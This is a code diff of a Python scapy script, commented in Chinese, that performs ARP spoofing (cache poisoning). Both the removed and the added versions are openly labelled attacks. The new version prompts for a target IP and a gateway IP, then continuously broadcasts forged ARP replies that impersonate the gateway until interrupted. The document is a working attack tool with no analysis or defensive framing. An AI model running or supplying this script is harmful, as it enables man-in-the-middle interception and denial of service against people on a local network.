@@ -1,23 +1,22 @@
-import os
-from scapy.all import *
-from scapy.all import ARP, Ether, srp
-from art import *
-from colorama import init, Fore, Back, Style
+import sys
+from scapy.all import ARP, Ether, sendp
 
+# 获取目标IP和网关IP地址
+target_ip = input("请输入目标IP地址: ")
+gateway_ip = input("请输入网关IP地址: ")
 
-ctrl = "0"
+# 构造ARP请求包并发送到目标IP和网关IP
+packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
+sendp(packet)
 
-# import ip
-# ip.Scan_for_IP
-
-k_command = input(Fore.GREEN + "你要攻击哪一个IP？ >>>")
-k_command2 = input("攻击源IP是什么？(一般为网关) >>> ")
-arp_packet = ARP(pdst=k_command, psrc=k_command2)
-k_command3 = input("要攻击的MAC地址是？ >>> ")
-eth_packet = Ether(dst=k_command3)
-packet = eth_packet/arp_packet
-# 发送ARP数据包
-
-num_attacks = int(input(Fore.RED + "你要攻击多少次? >>> "))
-for i in range(num_attacks):
-    send(packet)
+# 持续进行ARP欺骗攻击
+while True:
+    try:
+        # 发送伪造的ARP响应包给目标IP和网关IP，告诉他们自己就是对方
+        packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip)
+        sendp(packet)
+        print(f"已发送ARP欺骗攻击至 {target_ip} 和 {gateway_ip}")
+    except KeyboardInterrupt:
+        # 如果用户按下Ctrl-C，则退出程序
+        print("用户中断程序")
+        sys.exit(0)
